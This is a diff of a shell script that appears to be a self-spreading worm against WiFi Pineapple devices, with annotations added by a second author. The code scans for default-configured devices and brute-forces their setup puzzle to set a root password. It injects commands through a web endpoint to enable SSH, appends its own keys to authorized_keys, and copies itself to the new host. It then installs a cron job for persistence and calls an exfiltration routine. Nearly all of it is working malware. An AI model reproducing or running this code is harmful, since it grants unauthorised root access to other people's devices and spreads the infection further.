@@ -3,15 +3,25 @@
 #Author: 
 #   twitter @catatonicprime 
 #   email (guess)
-#   
+#
+#n00b comments provided by:
+#ActualReverend   
+
+creds="username=root&password=pineapplesareyummy&login="
+sessid="tospovirus"
+token="_csrfToken=$(printf "$sessid" | openssl sha1 | egrep -o "[0-9a-f][0-9a-f]+")"
+sshoptions="-oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa"
+
 
 #Get a copy of our SSID which we'll black list so we don't do something silly like try to infect ourselves
 self=`uci get wireless.@wifi-iface[0].ssid`
 
 init() {
 	#Mark the device as being pwn3d.
+	#looks for factory default SSID without a space
 	if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
 	then
+		#add space in SSID to signal it has been infected
 		sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
 		uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
 		uci commit
@@ -21,6 +31,7 @@ init() {
 	#Make ourselves a key we'll use for all our children.
 	if [ ! -f /tospo/tospo_rsa.pub ]; then
 		echo "Generating tospo ssh key..."
+		#We use the smallest possible key for quickness of generating and transmission
 		ssh-keygen -b 768 -f /tospo/tospo_rsa -N ""
 	fi
 	#Backdoor this machine with the master key if it hasn't already been backdoored.
@@ -29,7 +40,9 @@ init() {
 	grep -q "$(cat /tospo/tvbd.pub)" /root/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys
 
 	#Give a little insight by sharing this device's heritage.
-	if [ ! -f /pineapple/tvi ]; then ln -s /tospo/tvi /pineapple/tvp; fi
+	if [ ! -f /pineapple/tvi ]; then 
+		ln -s /tospo/tvi /pineapple/tvp; 
+	fi
 }
 
 #Function used for storing current networking state. This state includes:
@@ -46,7 +59,7 @@ pushstate() {
 
 #Function used to restore a previous networking state, stored when calling pushstate
 #Note: This causes the networking to drop for a moment.
-popstate () {
+popstate() {
 	echo "Popping state..."
 	#Bring the bridge back up
 	ifconfig br-lan 172.16.42.1 up
@@ -103,11 +116,16 @@ connect() {
 	#Take a nap - this is so the client mode has a little bit of time to pull a new IP.
 	sleep 3
 	#Forget about the IP just use this one.
+	
 	#TODO: Disable pulling with DHCP if possible?
-	ifconfig wlan1 172.16.42.146
+	#ifconfig wlan1 172.16.42.146
 }
 
+
 #Function used to perform an HTTP post to the gateway 172.16.42.1 on port 1471
+# $1 - Resource to post to 
+# $2 - Post Data  
+# $3 - Session ID
 #An HTTP post looks like this:
 #POST /some/page.php HTTP/1.1
 #Host: 172.16.42.1:1471
@@ -125,10 +143,11 @@ post() {
 #Function solves the LED puzzle
 bf() {
 	echo "Brute forcing..."
-	session=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -o '[0-9a-z]{32}'`
+	session=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -om1 '[0-9a-z]{32}'`
 	for n in `seq 1 $1`
 	do
 		echo "Trying $n time..."
+		#change the puzzle until it matches our solution, which is all lights on.  "Kobayashi Maru"
 	        post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$session" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$session" | grep "success" && return 0
 	done
 	#return 1 - Failed!
@@ -138,8 +157,7 @@ bf() {
 #Once logged in other actions may be performed.
 login() {
 	echo "Logging in..."
-	creds="username=root&password=pineapplesareyummy&login="
-	post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && return 1
+	post '/includes/api/login.php' "$creds" "$sessid" | grep -i 'invalid username' && echo "Login Failed..." && return 1
 	echo "Logged in Successfully!"
 	#return 0 - Succeeded!
 	return 0
@@ -152,18 +170,18 @@ infect() {
 	#the authorized_keys file. Then we turn on SSH, this will grant us access/ability to
 	#use ssh commands to copy ourselves to the victim and execute commands.
 	#If the \\ scare you - don't touch them.
-	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
+	post '/components/system/configuration/functions.php?execute=' "$token&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "$sessid"
 	#use SSH to create the /tospo directory, then copy only desired files into it.
 	#This is where we successfully clone ourselves to the victim. The various -o Options
 	#are to avoid blocking errors which would require user-interaction. We want to simply
 	#ignore these options and so we decline or use /dev/null for file storage.
-	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 "mkdir -p /tospo" && scp -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
+	ssh $sshoptions 172.16.42.1 "mkdir -p /tospo" && scp $sshoptions -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
 }
 
 #Function used to execute SSH commands on the remote in order to establish future runtime
 #This installs the service, cronjob, etc. We try to do this only once on infection
 persist() {
-	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
+	ssh $sshoptions 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
 }
 
 #Function used to disclosure private WPA management data (read: password) using semi-secure RSA keys
@@ -176,7 +194,6 @@ exfiltrate() {
 
 #Run the virus...
 init
-exfiltrate
 echo "Scanning for new devices..."
 for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
 do
@@ -190,3 +207,4 @@ do
 	popstate
 	break
 done
+exfiltrate
